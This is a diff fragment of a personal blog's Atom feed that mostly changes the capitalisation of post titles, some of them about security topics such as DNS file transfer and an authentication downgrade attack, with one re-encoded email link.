     <updated>2014-03-11T06:10:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns</id>
@@ -4898,7 +5356,7 @@ Looking at the server, we see that the message is received:</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Zeus - My Adventure With a Infamous Bot]]></title>
+    <title type="html"><![CDATA[Zeus - My Adventure with a Infamous Bot]]></title>
     <link href="http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/"/>
     <updated>2013-09-23T14:21:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot</id>
@@ -5242,7 +5700,7 @@ Looking at the server, we see that the message is received:</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[KVM - Redirecting CentOS Kernel and Tty Output to a Virtual Serial Console]]></title>
+    <title type="html"><![CDATA[KVM - Redirecting CentOS Kernel and tty output to a virtual serial console]]></title>
     <link href="http://leonjza.github.io/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/"/>
     <updated>2013-08-03T08:27:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console</id>
@@ -5360,7 +5818,7 @@ Looking at the server, we see that the message is received:</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[URL Expansion - I'm Paranoid Like That]]></title>
+    <title type="html"><![CDATA[URL Expansion - I'm paranoid like that]]></title>
     <link href="http://leonjza.github.io/blog/2013/07/31/url-expansion-im-paranoid-like-that/"/>
     <updated>2013-07-31T18:19:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/07/31/url-expansion-im-paranoid-like-that</id>
@@ -5425,7 +5883,7 @@ A similar effect can be seen with this one curl command:</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA['Stuff' to Gource.]]></title>
+    <title type="html"><![CDATA['stuff' to Gource.]]></title>
     <link href="http://leonjza.github.io/blog/2013/07/27/stuff-to-gource/"/>
     <updated>2013-07-27T14:09:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/07/27/stuff-to-gource</id>
@@ -5572,7 +6030,7 @@ A similar effect can be seen with this one curl command:</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[dtob.py: Digest to Basic Authentication; a Simple Example of a Authentication 'Downgrade' Attack]]></title>
+    <title type="html"><![CDATA[dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack]]></title>
     <link href="http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/"/>
     <updated>2013-06-25T18:52:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack</id>
@@ -5989,7 +6447,7 @@ A sample command to get this running would be: <code>python proxpy.py -p 8090 -x
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Jabber to Email Using SleekXMPP]]></title>
+    <title type="html"><![CDATA[Jabber to Email using SleekXMPP]]></title>
     <link href="http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp/"/>
     <updated>2013-06-07T10:48:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp</id>
@@ -6436,7 +6894,7 @@ The complete example will echo the message just before it attempts to mail it. Y
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[How to: Extremely Simple Python Jabber Broadcast Bot]]></title>
+    <title type="html"><![CDATA[How To: Extremely simple python Jabber Broadcast Bot]]></title>
     <link href="http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot/"/>
     <updated>2013-05-25T10:12:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot</id>
@@ -6573,7 +7031,7 @@ Once this plugin is installed, some minor configuration is required to allow the
 <p>Save this code to something like <code>jabbersend.py</code> and execute it like this:
 <code>python jabbersend.py all@broadcast.jabber.server message_file.txt</code></p>
 
-<p>If all went OK, you should have received a message from <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#97;&#98;&#x62;&#101;&#114;&#x5f;&#x62;&#x6f;&#116;&#64;&#106;&#x61;&#x62;&#98;&#x65;&#114;&#46;&#x73;&#x65;&#x72;&#118;&#101;&#114;">&#x6a;&#97;&#x62;&#98;&#x65;&#114;&#x5f;&#98;&#111;&#x74;&#x40;&#106;&#x61;&#98;&#x62;&#101;&#x72;&#x2e;&#x73;&#101;&#114;&#x76;&#101;&#114;</a> :P</p>
+<p>If all went OK, you should have received a message from <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#106;&#97;&#98;&#x62;&#101;&#x72;&#x5f;&#98;&#x6f;&#x74;&#x40;&#x6a;&#97;&#98;&#98;&#x65;&#114;&#46;&#115;&#x65;&#x72;&#118;&#101;&#114;">&#106;&#x61;&#98;&#98;&#x65;&#114;&#x5f;&#98;&#111;&#116;&#x40;&#x6a;&#x61;&#98;&#x62;&#x65;&#x72;&#46;&#115;&#101;&#114;&#118;&#x65;&#x72;</a> :P</p>
 
 <p>Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
 The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)</p>
@@ -6583,7 +7041,7 @@ The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Hello World! Oh and Here's Some Code!]]></title>
+    <title type="html"><![CDATA[Hello World! Oh and here's some code!]]></title>
     <link href="http://leonjza.github.io/blog/2013/05/24/hello-world-oh-and-heres-some-code/"/>
     <updated>2013-05-24T21:11:00+02:00</updated>
     <id>http://leonjza.github.io/blog/2013/05/24/hello-world-oh-and-heres-some-code</id>
